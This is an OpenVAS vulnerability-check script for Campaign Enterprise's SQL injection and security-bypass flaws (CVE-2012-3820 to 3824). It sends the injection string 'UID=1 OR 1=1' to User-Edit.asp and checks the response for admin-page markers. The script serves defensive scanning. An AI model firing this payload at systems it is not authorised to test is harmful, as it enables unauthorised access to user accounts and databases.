###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_campaign_enterprise_56117.nasl 3062 2016-04-14 11:03:39Z benallard $
#
# Campaign Enterprise Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Campaign Enterprise is prone to multiple security vulnerabilities
including:

1. Multiple security-bypass vulnerabilities
2. Multiple information-disclosure vulnerabilities
3. Multiple SQL injection vulnerabilities

Attackers can exploit these issues to bypass certain security
restrictions, obtain sensitive information, and carry out
unauthorized actions on the underlying database. Other attacks may
also be possible.

Campaign Enterprise 11.0.538 is vulnerable.";

tag_solution = "Updates are available. Please see the references for more information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103586";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(56117);
 script_cve_id("CVE-2012-3820","CVE-2012-3821","CVE-2012-3822","CVE-2012-3823","CVE-2012-3824");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 3062 $");

 script_name("Campaign Enterprise Multiple Security Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/56117");
 script_xref(name : "URL" , value : "http://www.arialsoftware.com/enterprise.htm");

 script_tag(name:"last_modification", value:"$Date: 2016-04-14 13:03:39 +0200 (Thu, 14 Apr 2016) $");
 script_tag(name:"creation_date", value:"2012-10-22 13:15:10 +0200 (Mon, 22 Oct 2012)");
 script_summary("Determine if access to User-Edit.asp is restricted");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list(cgi_dirs());

foreach dir (dirs) {
   
  url = dir + '/User-Edit.asp?UID=1%20OR%201=1'; 

  if(http_vuln_check(port:port, url:url,pattern:"<title>Campaign Enterprise", extra_check:make_list(">Logout</a>","Edit User","Admin Rights"))) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);

